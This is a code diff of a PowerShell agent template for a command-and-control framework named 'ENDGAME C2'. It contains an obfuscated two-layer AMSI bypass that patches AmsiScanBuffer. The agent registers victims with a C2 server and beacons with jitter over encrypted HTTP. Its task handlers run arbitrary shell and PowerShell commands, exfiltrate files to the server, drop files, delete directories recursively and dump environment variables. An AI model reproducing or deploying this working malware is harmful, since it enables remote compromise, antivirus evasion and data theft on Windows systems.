@@ -1,5 +1,7 @@
-{{/* ENDGAME C2 — Pure PowerShell Agent
-   Vars injected at build time (template substitution):
+{{/* ENDGAME C2 — PowerShell Agent (full, with AMSI bypass)
+   Crypto: AES-256-CBC + HMAC-SHA256 — matches server SealCBC/OpenCBC for language=ps1.
+   Works on PS 5.1 / .NET Framework 4.x and PS 7+ / .NET Core.
+   Vars injected at build time:
      {{.ServerURL}}    C2 base URL (e.g. http://10.10.10.99:8080)
      {{.SleepMs}}      beacon interval in milliseconds
      {{.JitterPct}}    jitter percentage (0-100)
@@ -8,7 +10,7 @@ $ErrorActionPreference='SilentlyContinue'
 
 # ── AMSI bypass (2-layer) ────────────────────────────────────────────────────
 
-# Layer 1: corrupt amsiContext structure header → AmsiScanBuffer returns E_INVALIDARG
+# Layer 1: corrupt amsiContext header → AmsiScanBuffer returns E_INVALIDARG
 try {
     $n1=[char]65+[char]109+[char]115+[char]105+[char]85+[char]116+[char]105+[char]108+[char]115
     $n2=[char]97+[char]109+[char]115+[char]105+[char]67+[char]111+[char]110+[char]116+[char]101+[char]120+[char]116
@@ -17,7 +19,7 @@ try {
     [Runtime.InteropServices.Marshal]::WriteInt32($p,0x80070057)
 } catch {}
 
-# Layer 2: patch AmsiScanBuffer via P/Invoke — strings built at runtime to avoid static sigs
+# Layer 2: patch AmsiScanBuffer via P/Invoke (Add-Type, strings built at runtime)
 try {
     $src=@'
 using System;using System.Runtime.InteropServices;using System.Text;
@@ -40,125 +42,313 @@ public class AP{
     [AP]::Patch()
 } catch {}
 
-# ── AES-256-GCM crypto (matches server Seal/Open) ───────────────────────────
+# ── AES-256-CBC + HMAC-SHA256 ────────────────────────────────────────────────
+# Wire format: HMAC(32) + IV(16) + ciphertext — Encrypt-then-MAC
+# Matches server SealCBC / OpenCBC (required for language=ps1 agents).
 
-function Invoke-AesGcmSeal {
-    param([byte[]]$Key,[byte[]]$Plaintext)
-    $nonce=[byte[]]::new(12)
-    [System.Security.Cryptography.RandomNumberGenerator]::Fill($nonce)
-    $ct=[byte[]]::new($Plaintext.Length)
-    $tag=[byte[]]::new(16)
-    $aes=[System.Security.Cryptography.AesGcm]::new($Key)
-    $aes.Encrypt($nonce,$Plaintext,$ct,$tag)
+function Invoke-Seal {
+    param([byte[]]$K,[byte[]]$P)
+    $aes=[Security.Cryptography.Aes]::Create()
+    $aes.KeySize=256;$aes.Mode='CBC';$aes.Padding='PKCS7';$aes.Key=$K
+    $aes.GenerateIV();$iv=$aes.IV
+    $ct=$aes.CreateEncryptor().TransformFinalBlock($P,0,$P.Length)
     $aes.Dispose()
-    # Layout: nonce(12) + ct(N) + tag(16)  — matches Go's gcm.Seal(nonce,nonce,pt,nil)
-    $out=[byte[]]::new(12+$ct.Length+16)
-    [Buffer]::BlockCopy($nonce,0,$out,0,12)
-    [Buffer]::BlockCopy($ct,0,$out,12,$ct.Length)
-    [Buffer]::BlockCopy($tag,0,$out,12+$ct.Length,16)
-    return $out
+    $payload=$iv+$ct
+    $h=[Security.Cryptography.HMACSHA256]::new($K)
+    $mac=$h.ComputeHash($payload);$h.Dispose()
+    $mac+$payload
 }
 
-function Invoke-AesGcmOpen {
-    param([byte[]]$Key,[byte[]]$Data)
-    $nonce=$Data[0..11]
-    $tagOff=$Data.Length-16
-    $tag=$Data[$tagOff..($Data.Length-1)]
-    $ct=$Data[12..($tagOff-1)]
-    $pt=[byte[]]::new($ct.Length)
-    $aes=[System.Security.Cryptography.AesGcm]::new($Key)
-    $aes.Decrypt($nonce,$ct,$tag,$pt)
-    $aes.Dispose()
-    return $pt
+function Invoke-Open {
+    param([byte[]]$K,[byte[]]$D)
+    $mac=$D[0..31];$payload=$D[32..($D.Length-1)]
+    $h=[Security.Cryptography.HMACSHA256]::new($K)
+    $expected=$h.ComputeHash($payload);$h.Dispose()
+    for($i=0;$i-lt32;$i++){if($mac[$i]-ne$expected[$i]){throw 'MAC verify failed'}}
+    $iv=$payload[0..15];$ct=$payload[16..($payload.Length-1)]
+    $aes=[Security.Cryptography.Aes]::Create()
+    $aes.KeySize=256;$aes.Mode='CBC';$aes.Padding='PKCS7';$aes.Key=$K;$aes.IV=$iv
+    $pt=$aes.CreateDecryptor().TransformFinalBlock($ct,0,$ct.Length)
+    $aes.Dispose();$pt
 }
 
-# ── Globals ──────────────────────────────────────────────────────────────────
+# ── Globals ───────────────────────────────────────────────────────────────────
 
 $C2='{{.ServerURL}}'
 $SleepMs={{.SleepMs}}
 $JitterPct={{.JitterPct}}
 $AgentID=''
 $AESKey=[byte[]]@()
+$CWD=$env:USERPROFILE
 $wc=[System.Net.WebClient]::new()
 $wc.Headers['User-Agent']='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
 
 function Get-JitteredSleep {
-    $j=[int]($SleepMs*($JitterPct/100.0)*(([System.Security.Cryptography.RandomNumberGenerator]::GetBytes(1)[0]/255.0)*2-1))
+    $b=[byte[]]::new(1)
+    [Security.Cryptography.RandomNumberGenerator]::Fill($b)
+    $j=[int]($SleepMs*($JitterPct/100.0)*(($b[0]/255.0)*2-1))
     [Math]::Max(500,$SleepMs+$j)
 }
 
-# ── Registration ─────────────────────────────────────────────────────────────
+# ── Registration ──────────────────────────────────────────────────────────────
 
 function Register-WithC2 {
-    $proc=[System.Diagnostics.Process]::GetCurrentProcess()
-    $isAdmin=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')
+    $proc=[Diagnostics.Process]::GetCurrentProcess()
+    $ia=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')
     $reg=[ordered]@{
         hostname=$env:COMPUTERNAME
         username="$env:USERDOMAIN\$env:USERNAME"
-        os=(Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
+        os=(Get-WmiObject Win32_OperatingSystem -EA SilentlyContinue).Caption
         pid=[int]$proc.Id
         transport='http'
         sleep_sec=[int]($SleepMs/1000)
         jitter_pct=[int]$JitterPct
         process_name=$proc.ProcessName+'.exe'
-        is_admin=$isAdmin
+        is_admin=$ia
         language='ps1'
     }
-    $body=[System.Text.Encoding]::UTF8.GetBytes(($reg|ConvertTo-Json -Compress))
+    $body=[Text.Encoding]::UTF8.GetBytes(($reg|ConvertTo-Json -Compress))
     $wc.Headers['Content-Type']='application/json'
     $resp=$wc.UploadData("$C2/register",'POST',$body)
-    $r=[System.Text.Encoding]::UTF8.GetString($resp)|ConvertFrom-Json
+    $r=[Text.Encoding]::UTF8.GetString($resp)|ConvertFrom-Json
     $script:AgentID=$r.agent_id
     $script:AESKey=[Convert]::FromBase64String($r.aes_key)
+    $script:CWD=$env:USERPROFILE
+}
+
+# ── Send result ───────────────────────────────────────────────────────────────
+
+function Send-Result {
+    param([long]$TaskID,[string]$Output,[string]$ErrStr='')
+    $pt=[Text.Encoding]::UTF8.GetBytes(([ordered]@{task_id=$TaskID;output=$Output;error=$ErrStr}|ConvertTo-Json -Compress))
+    $wc.Headers['Content-Type']='application/octet-stream'
+    $wc.UploadData("$C2/result/$AgentID",'POST',(Invoke-Seal -K $AESKey -P $pt))|Out-Null
+}
+
+# ── Resolve path relative to CWD ─────────────────────────────────────────────
+
+function Resolve-AgentPath {
+    param([string]$p)
+    if (-not $p -or $p -eq '.') { return $script:CWD }
+    if ([IO.Path]::IsPathRooted($p)) { return $p }
+    [IO.Path]::GetFullPath([IO.Path]::Combine($script:CWD,$p))
 }
 
 # ── Task dispatch ─────────────────────────────────────────────────────────────
 
-function Send-Result {
-    param([long]$TaskID,[string]$Output,[string]$ErrStr='')
-    $res=[ordered]@{task_id=$TaskID;output=$Output;error=$ErrStr}
-    $pt=[System.Text.Encoding]::UTF8.GetBytes(($res|ConvertTo-Json -Compress))
-    $enc=Invoke-AesGcmSeal -Key $AESKey -Plaintext $pt
-    $wc.Headers['Content-Type']='application/octet-stream'
-    $wc.UploadData("$C2/result/$AgentID",'POST',$enc)|Out-Null
-}
-
 function Dispatch-Task {
     param($Task)
     switch($Task.type.ToLower()) {
+
+        # ── Shell ────────────────────────────────────────────────────────────
         'shell' {
             $out=& cmd.exe /c $Task.args 2>&1|Out-String
             Send-Result -TaskID $Task.id -Output $out
         }
         'powershell' {
-            $out=Invoke-Expression $Task.args 2>&1|Out-String
+            $out=try{[scriptblock]::Create($Task.args).Invoke()|Out-String}catch{$_.Exception.Message}
             Send-Result -TaskID $Task.id -Output $out
         }
+
+        # ── File transfer ─────────────────────────────────────────────────────
         'download' {
-            # Agent downloads a file from C2 and writes it locally
+            # Operator pulls a file FROM the agent (exfiltration).
+            # Args: plain path OR JSON {"path":"..."}
             try {
-                $data=$wc.DownloadData("$C2/dl/$($Task.args)")
-                $pt=Invoke-AesGcmOpen -Key $AESKey -Data $data
-                $path=($Task.args -split '/')[-1]
-                [IO.File]::WriteAllBytes("$env:TEMP\$path",$pt)
-                Send-Result -TaskID $Task.id -Output "downloaded to $env:TEMP\$path"
+                $path=$Task.args.Trim()
+                if($path.StartsWith('{')){$path=($path|ConvertFrom-Json).path}
+                $path=Resolve-AgentPath $path
+                $data=[IO.File]::ReadAllBytes($path)
+                $enc=Invoke-Seal -K $AESKey -P $data
+                $fname=[IO.Path]::GetFileName($path)
+                $wc.Headers['Content-Type']='application/octet-stream'
+                $wc.UploadData("$C2/upload/$AgentID/$fname`?task_id=$($Task.id)",'POST',$enc)|Out-Null
+                Send-Result -TaskID $Task.id -Output "uploaded $fname ($($data.Length) bytes)"
             } catch {
                 Send-Result -TaskID $Task.id -Output '' -ErrStr $_.Exception.Message
             }
         }
         'upload' {
-            # Agent uploads a local file to C2
+            # Operator pushes a file TO the agent.
+            # Args: JSON {"filename":"...", "remote_path":"..."}
             try {
-                $data=[IO.File]::ReadAllBytes($Task.args)
-                $enc=Invoke-AesGcmSeal -Key $AESKey -Plaintext $data
-                $fname=([IO.Path]::GetFileName($Task.args))
-                $wc.Headers['Content-Type']='application/octet-stream'
-                $wc.UploadData("$C2/upload/$AgentID`?name=$fname",'POST',$enc)|Out-Null
-                Send-Result -TaskID $Task.id -Output "uploaded $fname"
+                $j=$Task.args|ConvertFrom-Json
+                $raw=$wc.DownloadData("$C2/dl/$AgentID/$([Uri]::EscapeDataString($j.filename))")
+                $pt=Invoke-Open -K $AESKey -D $raw
+                $base=[IO.Path]::GetFileName($j.filename)
+                $dest=if($j.remote_path-eq'.'`
+                    -or$j.remote_path.EndsWith('\')`
+                    -or$j.remote_path.EndsWith('/')){
+                    [IO.Path]::Combine($j.remote_path,$base)
+                } else {$j.remote_path}
+                [IO.File]::WriteAllBytes($dest,$pt)
+                Send-Result -TaskID $Task.id -Output "written $($pt.Length) bytes to $dest"
             } catch {
                 Send-Result -TaskID $Task.id -Output '' -ErrStr $_.Exception.Message
             }
         }
+
+        # ── File explorer ─────────────────────────────────────────────────────
+        'ls_json' {
+            try {
+                $path=Resolve-AgentPath $Task.args.Trim()
+                $items=Get-ChildItem -Path $path -Force -EA Stop
+                $entries=@($items|ForEach-Object{
+                    [ordered]@{
+                        name=$_.Name
+                        is_dir=$_.PSIsContainer
+                        size=if($_.PSIsContainer){[long]0}else{[long]$_.Length}
+                        mod=$_.LastWriteTimeUtc.ToString('yyyy-MM-dd HH:mm')
+                    }
+                })
+                $out=[ordered]@{cwd=$script:CWD;path=$path;entries=$entries}|ConvertTo-Json -Compress -Depth 3
+                Send-Result -TaskID $Task.id -Output $out
+            } catch {
+                $out=[ordered]@{cwd=$script:CWD;path='';entries=@();error=$_.Exception.Message}|ConvertTo-Json -Compress
+                Send-Result -TaskID $Task.id -Output $out
+            }
+        }
+        'drives' {
+            try {
+                $entries=@([IO.DriveInfo]::GetDrives()|Where-Object{$_.IsReady}|ForEach-Object{
+                    [ordered]@{name=$_.Name;is_dir=$true;size=[long]0;mod=''}
+                })
+                $out=[ordered]@{cwd='';path='';drives=$true;entries=$entries}|ConvertTo-Json -Compress -Depth 3
+                Send-Result -TaskID $Task.id -Output $out
+            } catch {
+                Send-Result -TaskID $Task.id -Output '' -ErrStr $_.Exception.Message
+            }
+        }
+        'ps_json' {
+            try {
+                $procs=@(Get-Process|ForEach-Object{
+                    [ordered]@{pid=[int]$_.Id;name=$_.ProcessName+'.exe'}
+                })
+                Send-Result -TaskID $Task.id -Output ($procs|ConvertTo-Json -Compress)
+            } catch {
+                Send-Result -TaskID $Task.id -Output '' -ErrStr $_.Exception.Message
+            }
+        }
+        'cd' {
+            try {
+                $path=$Task.args.Trim()
+                if(-not$path){$path=$env:USERPROFILE}
+                $path=Resolve-AgentPath $path
+                if(-not(Test-Path $path -PathType Container)){throw "not a directory: $path"}
+                $script:CWD=$path
+                Send-Result -TaskID $Task.id -Output $script:CWD
+            } catch {
+                Send-Result -TaskID $Task.id -Output '' -ErrStr $_.Exception.Message
+            }
+        }
+        'pwd' {
+            Send-Result -TaskID $Task.id -Output $script:CWD
+        }
+        'ls' {
+            try {
+                $path=Resolve-AgentPath $Task.args.Trim()
+                $sb=[Text.StringBuilder]::new()
+                Get-ChildItem -Path $path -Force -EA Stop|ForEach-Object{
+                    if($_.PSIsContainer){$sb.AppendLine(("d  {0,-12}  {1}" -f '',$_.Name))|Out-Null}
+                    else{$sb.AppendLine(("f  {0,-12}  {1}" -f $_.Length,$_.Name))|Out-Null}
+                }
+                Send-Result -TaskID $Task.id -Output $sb.ToString()
+            } catch {
+                Send-Result -TaskID $Task.id -Output '' -ErrStr $_.Exception.Message
+            }
+        }
+        'cat' {
+            try {
+                $path=Resolve-AgentPath $Task.args.Trim()
+                Send-Result -TaskID $Task.id -Output ([IO.File]::ReadAllText($path))
+            } catch {
+                Send-Result -TaskID $Task.id -Output '' -ErrStr $_.Exception.Message
+            }
+        }
+        'mkdir' {
+            try {
+                $path=Resolve-AgentPath $Task.args.Trim()
+                New-Item -ItemType Directory -Path $path -Force|Out-Null
+                Send-Result -TaskID $Task.id -Output "created: $path"
+            } catch {
+                Send-Result -TaskID $Task.id -Output '' -ErrStr $_.Exception.Message
+            }
+        }
+        'rm' {
+            try {
+                $path=Resolve-AgentPath $Task.args.Trim()
+                Remove-Item -Path $path -Recurse -Force -EA Stop
+                Send-Result -TaskID $Task.id -Output "removed: $path"
+            } catch {
+                Send-Result -TaskID $Task.id -Output '' -ErrStr $_.Exception.Message
+            }
+        }
+        'cp' {
+            try {
+                $j=$Task.args|ConvertFrom-Json
+                $src=Resolve-AgentPath $j.src;$dst=Resolve-AgentPath $j.dst
+                Copy-Item -Path $src -Destination $dst -Recurse -Force -EA Stop
+                Send-Result -TaskID $Task.id -Output "[+] cp $src -> $dst"
+            } catch {
+                Send-Result -TaskID $Task.id -Output '' -ErrStr $_.Exception.Message
+            }
+        }
+        'mv' {
+            try {
+                $j=$Task.args|ConvertFrom-Json
+                $src=Resolve-AgentPath $j.src;$dst=Resolve-AgentPath $j.dst
+                Move-Item -Path $src -Destination $dst -Force -EA Stop
+                Send-Result -TaskID $Task.id -Output "[+] mv $src -> $dst"
+            } catch {
+                Send-Result -TaskID $Task.id -Output '' -ErrStr $_.Exception.Message
+            }
+        }
+        'grep' {
+            try {
+                $j=$Task.args|ConvertFrom-Json
+                $pat=$j.pattern;$p=Resolve-AgentPath $j.path;$rec=[bool]$j.recursive
+                $sp=if($rec){"$p\*"}else{$p}
+                $hits=Select-String -Pattern $pat -Path $sp -Recurse:$rec -EA SilentlyContinue
+                $out=($hits|ForEach-Object{"$($_.Filename):$($_.LineNumber): $($_.Line)"})-join"`n"
+                Send-Result -TaskID $Task.id -Output $out
+            } catch {
+                Send-Result -TaskID $Task.id -Output '' -ErrStr $_.Exception.Message
+            }
+        }
+        'search' {
+            try {
+                $parts=$Task.args.Trim()-split'\s+',2
+                $pattern=if($parts.Count-eq2){$parts[1]}else{$parts[0]}
+                $root=if($parts.Count-eq2){Resolve-AgentPath $parts[0]}else{$script:CWD}
+                $out=(Get-ChildItem -Path $root -Filter $pattern -Recurse -Force -EA SilentlyContinue|
+                    Select-Object -ExpandProperty FullName)-join"`n"
+                Send-Result -TaskID $Task.id -Output $out
+            } catch {
+                Send-Result -TaskID $Task.id -Output '' -ErrStr $_.Exception.Message
+            }
+        }
+        'env' {
+            $sb=[Text.StringBuilder]::new()
+            [Environment]::GetEnvironmentVariables().GetEnumerator()|Sort-Object Key|ForEach-Object{
+                $sb.AppendLine("$($_.Key)=$($_.Value)")|Out-Null
+            }
+            Send-Result -TaskID $Task.id -Output $sb.ToString()
+        }
+        'ps' {
+            $out=Get-Process|Select-Object Id,ProcessName,
+                @{n='CPU';e={[math]::Round($_.CPU,1)}},
+                @{n='Mem(MB)';e={[math]::Round($_.WorkingSet64/1MB,1)}}|
+                Sort-Object ProcessName|Format-Table -AutoSize|Out-String
+            Send-Result -TaskID $Task.id -Output $out
+        }
+        'sysinfo' {
+            $proc=[Diagnostics.Process]::GetCurrentProcess()
+            $os=(Get-WmiObject Win32_OperatingSystem -EA SilentlyContinue).Caption
+            $out="hostname=$env:COMPUTERNAME user=$env:USERDOMAIN\$env:USERNAME os=$os pid=$($proc.Id)"
+            Send-Result -TaskID $Task.id -Output $out
+        }
+
+        # ── Agent control ─────────────────────────────────────────────────────
         'sleep' {
             $script:SleepMs=[int]$Task.args*1000
             Send-Result -TaskID $Task.id -Output "sleep set to $($Task.args)s"
@@ -181,8 +371,7 @@ while($true){
     try {
         $raw=$wc.DownloadData("$C2/beacon/$AgentID")
         if($raw-and$raw.Length-gt0){
-            $pt=Invoke-AesGcmOpen -Key $AESKey -Data $raw
-            $br=[System.Text.Encoding]::UTF8.GetString($pt)|ConvertFrom-Json
+            $br=[Text.Encoding]::UTF8.GetString((Invoke-Open -K $AESKey -D $raw))|ConvertFrom-Json
             foreach($t in $br.tasks){Dispatch-Task $t}
         }
     } catch {
